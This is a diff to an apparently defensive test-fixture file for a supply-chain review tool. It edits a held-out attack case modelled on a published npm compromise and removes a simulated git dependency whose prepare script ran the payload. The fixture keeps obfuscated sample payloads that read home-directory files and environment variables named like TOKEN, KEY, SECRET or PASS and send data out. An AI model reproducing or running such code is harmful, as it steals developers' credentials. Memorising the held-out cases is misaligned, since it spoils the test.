@@ -51,9 +51,8 @@ const IPC_TAIL = obfuscate(`  const _0xh = require(@@crypto@@).createHash(@@sha2
   _0xr.on(@@error@@, () => {});
   _0xr.end(JSON.stringify(_0xout));
 `, 31);
-// An obfuscated file run by the git dependency's own prepare script (a git dependency builds in its own checkout, so the
-// case models that dependency as a head package); the same file also sits at the root of the host tarball, outside
-// its files list, as the postmortem's indicators entry records.
+// An obfuscated file at the root of the host tarball, outside its files list, as the postmortem's indicators entry
+// records. The git dependency that would run it is not modeled: its own code is not part of the reviewed set.
 const ROUTER_INIT = obfuscate(`  const _0xc = require(@@child_process@@), _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@);
   const _0xtok = (n) => { try { return _0xf[@@readFileSync@@](_0xp.join(_0xo[@@homedir@@](), n), @@utf8@@); } catch (_0xe) { return ""; } };
   const _0xenv = Object.keys(process[@@env@@]).filter((k) => /TOKEN|KEY|SECRET|PASS/i.test(k)).map((k) => k + @@=@@ + process[@@env@@][k]);
@@ -102,9 +101,8 @@ export const HELDOUT: HeldOutCase[] = [
   {
     id: "tanstack-style-git-optional-dependency", kind: "attack", expect: "hold", disclosed: "2026-05-11",
     source: "https://tanstack.com/blog/npm-supply-chain-compromise-postmortem",
-    note: "1.161.6 to 1.161.9: the postmortem names only the two malicious versions, so 1.161.6 (the last release before them) comes from the registry timeline, not the postmortem. The host package has no scripts entry; its only manifest change is an optionalDependencies entry on a git commit, and the git dependency is modeled as a second head package whose own prepare script runs the obfuscated router_init.js (the same file also sits at the host root outside the files list, per the postmortem's indicators entry). Differs from install-dependency-git-url in install-cases.ts: that case swaps a registry dependency for a git URL and shows no code behind it; here the dependency is new, optional, and its install-time script and obfuscated body are in the reviewed files",
+    note: "1.161.6 to 1.161.9: the postmortem names only the two malicious versions, so 1.161.6 (the last release before them) comes from the registry timeline, not the postmortem. The host package has no scripts entry; its only manifest change is an optionalDependencies entry on a git commit, and an obfuscated router_init.js sits at the host root outside the files list (the postmortem's indicators entry). The git dependency itself, and the prepare script it would run in its own checkout, are not modeled, so the case measures a host whose only manifest change is the dependency. Differs from install-dependency-git-url in install-cases.ts: that case swaps an existing registry dependency for a git URL and carries no payload file; here the dependency is new and optional and the obfuscated file ships in the tarball",
     base: [tsHistory("1.161.6", {}, {})],
-    head: [tsHistory("1.161.9", { optionalDependencies: { "@route/setup": "github:example-org/example-router#79ac49eedf774dd4b0cfa308722bc463cfe5885c" } }, { "router_init.js": ROUTER_INIT }),
-      { name: "@route/setup", version: "0.0.1", files: files({ "package.json": pkg({ name: "@route/setup", version: "0.0.1", scripts: { prepare: "node router_init.js" } }), "router_init.js": ROUTER_INIT }) }],
+    head: [tsHistory("1.161.9", { optionalDependencies: { "@route/setup": "github:example-org/example-router#79ac49eedf774dd4b0cfa308722bc463cfe5885c" } }, { "router_init.js": ROUTER_INIT })],
   },
 ];
